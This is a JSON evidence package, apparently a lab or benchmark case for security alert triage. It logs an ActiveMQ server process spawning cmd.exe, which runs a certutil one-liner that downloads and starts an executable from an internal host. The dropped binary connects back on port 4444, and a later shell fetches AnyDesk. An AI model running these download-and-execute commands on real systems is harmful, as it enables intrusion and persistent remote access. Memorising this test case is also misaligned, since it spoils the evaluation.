@@ -1,0 +1,340 @@
+{
+  "schema_version": "1.0",
+  "case_id": "AMQ-001",
+  "package_type": "neutral_security_event_package",
+  "observed_context": {
+    "computers": [
+      "host-01.corp.local"
+    ],
+    "users": [
+      "Administrator",
+      "host-01\\Administrator"
+    ],
+    "time_window_utc": {
+      "start": "2026-04-24T09:20:01.3413399Z",
+      "end": "2026-04-24T09:26:51.0214438Z"
+    },
+    "event_count": 13,
+    "event_types_present": [
+      "file_create",
+      "network_connection",
+      "process_create"
+    ],
+    "sourcetypes_present": [
+      "Microsoft-Windows-Sysmon/Operational",
+      "Microsoft-Windows-Security-Auditing"
+    ]
+  },
+  "main_alert": {
+    "evidence_id": "A0",
+    "is_triggering_alert": true,
+    "event_time_utc": "2026-04-24T09:20:01.3488986Z",
+    "event_type": "process_create",
+    "source_event": {
+      "provider": "Microsoft-Windows-Sysmon",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_code": 1,
+      "event_record_id": "sysmon:7134"
+    },
+    "computer": "host-01.corp.local",
+    "attributes": {
+      "process_guid": "{0741354c-35c1-69eb-4b05-000000006702}",
+      "process_id": "6172",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "original_file_name": "Cmd.Exe",
+      "command_line": "cmd.exe /c \"certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %%TEMP%%\\qSwUwejx.exe & start /B %%TEMP%%\\qSwUwejx.exe\"",
+      "current_directory": "C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\",
+      "user": "host-01\\Administrator",
+      "integrity_level": "High",
+      "hashes": "MD5=F63068E624FE6B82058AAAA671D4BC96,SHA256=90D120880614E1E2A94067BAAD1454B09E2BE7A9DA51B71E33C247077D9F9538,IMPHASH=D60B77062898DC6BFAE7FE11A0F8806C",
+      "parent_process_guid": "{0741354c-3142-69eb-e404-000000006702}",
+      "parent_process_id": "7584",
+      "parent_image": "C:\\Program Files\\Java\\jdk-26.0.1\\bin\\java.exe",
+      "parent_command_line": "\"C:\\Program Files\\Java\\jdk-26.0.1\\bin\\java.exe\" -Dcom.sun.management.jmxremote -Xms1G -Xmx1G -Djava.util.logging.config.file=logging.properties -Djava.security.auth.login.config=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\conf\\login.config -Dactivemq.classpath=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\conf;C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\../conf;C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\../conf; -Dactivemq.home=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\.. -Dactivemq.base=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\.. -Dactivemq.conf=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\conf -Dactivemq.data=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\data -Djolokia.conf=file:C:\\\\Users\\\\Administrator\\\\Downloads\\\\apache-activemq-5.18.1-bin\\\\apache-activemq-5.18.1\\\\bin\\\\..\\\\conf\\\\jolokia-access.xml -Djava.io.tmpdir=C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\..\\data\\tmp -jar C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\bin\\../bin/activemq.jar start"
+    }
+  },
+  "evidence_items": [
+    {
+      "evidence_id": "EV-001",
+      "event_time_utc": "2026-04-24T09:20:01.3413399Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "channel": "Security",
+        "event_code": 4688,
+        "event_record_id": "security:325120"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "new_process_name": "C:\\Windows\\System32\\cmd.exe",
+        "new_process_id": "0x181c",
+        "parent_process_name": "C:\\Program Files\\Java\\jdk-26.0.1\\bin\\java.exe",
+        "creator_process_id": "0x1da0",
+        "subject_user_name": "Administrator",
+        "subject_domain_name": "host-01",
+        "subject_logon_id": "0x11c15c",
+        "mandatory_label": "Mandatory Label\\High Mandatory Level"
+      }
+    },
+    {
+      "evidence_id": "EV-002",
+      "event_time_utc": "2026-04-24T09:20:01.4212267Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "channel": "Security",
+        "event_code": 4688,
+        "event_record_id": "security:325122"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "new_process_name": "C:\\Windows\\System32\\certutil.exe",
+        "new_process_id": "0x1b88",
+        "parent_process_name": "C:\\Windows\\System32\\cmd.exe",
+        "creator_process_id": "0x181c",
+        "subject_user_name": "Administrator",
+        "subject_domain_name": "host-01",
+        "subject_logon_id": "0x11c15c",
+        "mandatory_label": "Mandatory Label\\High Mandatory Level"
+      }
+    },
+    {
+      "evidence_id": "EV-003",
+      "event_time_utc": "2026-04-24T09:20:01.4771646Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 1,
+        "event_record_id": "sysmon:7135"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{0741354c-35c1-69eb-4d05-000000006702}",
+        "process_id": "7048",
+        "image": "C:\\Windows\\System32\\certutil.exe",
+        "original_file_name": "CertUtil.exe",
+        "command_line": "certutil  -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe ",
+        "current_directory": "C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\",
+        "user": "host-01\\Administrator",
+        "integrity_level": "High",
+        "hashes": "MD5=0B25C6BB1E312AB02CFDC9EAA72D3C4E,SHA256=9BF54C3666926B43418C647BC70BE72A94CBDFF62091784AF626D4ACC163A98D,IMPHASH=02CB6949ACFAA0B84149D99111C16734",
+        "parent_process_guid": "{0741354c-35c1-69eb-4b05-000000006702}",
+        "parent_process_id": "6172",
+        "parent_image": "C:\\Windows\\System32\\cmd.exe",
+        "parent_command_line": "cmd.exe /c \"certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %TEMP%\\qSwUwejx.exe & start /B %TEMP%\\qSwUwejx.exe\""
+      }
+    },
+    {
+      "evidence_id": "EV-004",
+      "event_time_utc": "2026-04-24T09:20:01.9192846Z",
+      "event_type": "file_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 11,
+        "event_record_id": "sysmon:7136"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{0741354c-35c1-69eb-4d05-000000006702}",
+        "process_id": "7048",
+        "image": "C:\\Windows\\system32\\certutil.exe",
+        "target_filename": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe",
+        "creation_utc_time": "2026-04-24 09:20:01.918"
+      }
+    },
+    {
+      "evidence_id": "EV-005",
+      "event_time_utc": "2026-04-24T09:20:01.9303906Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "channel": "Security",
+        "event_code": 4688,
+        "event_record_id": "security:325123"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "new_process_name": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe",
+        "new_process_id": "0x16bc",
+        "parent_process_name": "C:\\Windows\\System32\\cmd.exe",
+        "creator_process_id": "0x181c",
+        "subject_user_name": "Administrator",
+        "subject_domain_name": "host-01",
+        "subject_logon_id": "0x11c15c",
+        "mandatory_label": "Mandatory Label\\High Mandatory Level"
+      }
+    },
+    {
+      "evidence_id": "EV-006",
+      "event_time_utc": "2026-04-24T09:20:01.9313041Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 1,
+        "event_record_id": "sysmon:7137"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{0741354c-35c1-69eb-4e05-000000006702}",
+        "process_id": "5820",
+        "image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe",
+        "original_file_name": "-",
+        "command_line": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe ",
+        "current_directory": "C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\",
+        "user": "host-01\\Administrator",
+        "integrity_level": "High",
+        "hashes": "MD5=434782068B13EEBBB6E0C1364AEE5B3D,SHA256=F6A283B7CA0D665C7420C313C14A16ECF67EDE5DB0940177544F446B5D1DB10B,IMPHASH=C2D02FC98F1D75D7B9457468EC75DA0E",
+        "parent_process_guid": "{0741354c-35c1-69eb-4b05-000000006702}",
+        "parent_process_id": "6172",
+        "parent_image": "C:\\Windows\\System32\\cmd.exe",
+        "parent_command_line": "cmd.exe /c \"certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %TEMP%\\qSwUwejx.exe & start /B %TEMP%\\qSwUwejx.exe\""
+      }
+    },
+    {
+      "evidence_id": "EV-007",
+      "event_time_utc": "2026-04-24T09:20:03.3092296Z",
+      "event_type": "network_connection",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 3,
+        "event_record_id": "sysmon:7144"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{0741354c-35c1-69eb-4e05-000000006702}",
+        "process_id": "5820",
+        "image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe",
+        "user": "host-01\\Administrator",
+        "protocol": "tcp",
+        "initiated": "true",
+        "source_ip": "10.0.2.12",
+        "source_port": "50834",
+        "destination_ip": "10.0.2.13",
+        "destination_hostname": "ip-10-0-2-13.eu-west-1.compute.internal",
+        "destination_port": "4444"
+      }
+    },
+    {
+      "evidence_id": "EV-008",
+      "event_time_utc": "2026-04-24T09:25:31.1056638Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "channel": "Security",
+        "event_code": 4688,
+        "event_record_id": "security:325150"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "new_process_name": "C:\\Windows\\System32\\cmd.exe",
+        "new_process_id": "0xf1c",
+        "parent_process_name": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\qSwUwejx.exe",
+        "creator_process_id": "0x16bc",
+        "subject_user_name": "Administrator",
+        "subject_domain_name": "host-01",
+        "subject_logon_id": "0x11c15c",
+        "mandatory_label": "Mandatory Label\\High Mandatory Level"
+      }
+    },
+    {
+      "evidence_id": "EV-009",
+      "event_time_utc": "2026-04-24T09:25:31.1066781Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 1,
+        "event_record_id": "sysmon:7171"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{0741354c-370b-69eb-6905-000000006702}",
+        "process_id": "3868",
+        "image": "C:\\Windows\\System32\\cmd.exe",
+        "original_file_name": "Cmd.Exe",
+        "command_line": "C:\\Windows\\system32\\cmd.exe ",
+        "current_directory": "C:\\Users\\Administrator\\Downloads\\apache-activemq-5.18.1-bin\\apache-activemq-5.18.1\\",
+        "user": "host-01\\Administrator",
+        "integrity_level": "High",
+        "hashes": "MD5=F63068E624FE6B82058AAAA671D4BC96,SHA256=90D120880614E1E2A94067BAAD1454B09E2BE7A9DA51B71E33C247077D9F9538,IMPHASH=D60B77062898DC6BFAE7FE11A0F8806C",
+        "parent_process_guid": "{00000000-0000-0000-0000-000000000000}",
+        "parent_process_id": "5820",
+        "parent_image": "-",
+        "parent_command_line": "-"
+      }
+    },
+    {
+      "evidence_id": "EV-010",
+      "event_time_utc": "2026-04-24T09:26:50.3785231Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "channel": "Security",
+        "event_code": 4688,
+        "event_record_id": "security:325162"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "new_process_name": "C:\\Windows\\System32\\certutil.exe",
+        "new_process_id": "0xccc",
+        "parent_process_name": "C:\\Windows\\System32\\cmd.exe",
+        "creator_process_id": "0xf1c",
+        "subject_user_name": "Administrator",
+        "subject_domain_name": "host-01",
+        "subject_logon_id": "0x11c15c",
+        "mandatory_label": "Mandatory Label\\High Mandatory Level"
+      }
+    },
+    {
+      "evidence_id": "EV-011",
+      "event_time_utc": "2026-04-24T09:26:50.3794015Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 1,
+        "event_record_id": "sysmon:7182"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{0741354c-375a-69eb-7505-000000006702}",
+        "process_id": "3276",
+        "image": "C:\\Windows\\System32\\certutil.exe",
+        "original_file_name": "CertUtil.exe",
+        "command_line": "certutil  -urlcache -split -f \"https://download.anydesk.com/AnyDesk.exe\" C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\anydesk.exe",
+        "current_directory": "C:\\",
+        "user": "host-01\\Administrator",
+        "integrity_level": "High",
+        "hashes": "MD5=0B25C6BB1E312AB02CFDC9EAA72D3C4E,SHA256=9BF54C3666926B43418C647BC70BE72A94CBDFF62091784AF626D4ACC163A98D,IMPHASH=02CB6949ACFAA0B84149D99111C16734",
+        "parent_process_guid": "{0741354c-370b-69eb-6905-000000006702}",
+        "parent_process_id": "3868",
+        "parent_image": "C:\\Windows\\System32\\cmd.exe",
+        "parent_command_line": "C:\\Windows\\system32\\cmd.exe "
+      }
+    },
+    {
+      "evidence_id": "EV-012",
+      "event_time_utc": "2026-04-24T09:26:51.0214438Z",
+      "event_type": "file_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 11,
+        "event_record_id": "sysmon:7183"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{0741354c-375a-69eb-7505-000000006702}",
+        "process_id": "3276",
+        "image": "C:\\Windows\\system32\\certutil.exe",
+        "target_filename": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\anydesk.exe",
+        "creation_utc_time": "2026-04-24 09:26:51.020"
+      }
+    }
+  ],
+  "deterministic_derivations": []
+}
